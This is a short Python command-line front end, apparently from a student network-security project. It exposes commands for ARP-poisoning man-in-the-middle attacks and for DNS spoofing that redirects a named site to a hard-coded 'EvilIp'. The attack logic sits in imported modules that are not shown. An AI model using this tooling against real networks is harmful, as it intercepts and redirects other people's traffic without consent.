import typer
from scapy.all import conf

import ArpPoison;

#from DNS_Spoofer import DnsSnoof
from queued_dns_spoof import Dns_spoof

app = typer.Typer()

@app.command()
def main(name: str, hasallcaps: bool = False):
    if hasallcaps:
        print(f"HELLO {name.upper()}")
    else:
        print(f"Hello {name}")

@app.command()
def Arp_MiM(ipVictim: str, ipServer: str):
    ArpPoison.MIMspoofARP(ipVictim=ipVictim, ipServer=ipServer)

@app.command()
def DNS_Spoof(ipVictim: str = "0.0.0.0", OGSite: str = 'tue.nl', EvilIp: str = "146.190.62.39", queue_num: int = 1, ipRouter = "Default Router"):
    
    if ipRouter == "Default Router":
        ipRouter = conf.route.route("0.0.0.0")[2]

    host = (OGSite, EvilIp)
    Dns_spoof(queue_num=queue_num, ipVictim=ipVictim, ipServer=ipRouter, host=host)

    print("This is a placeholder, you shouldn't be seeing this!")

if __name__ == "__main__":
    app()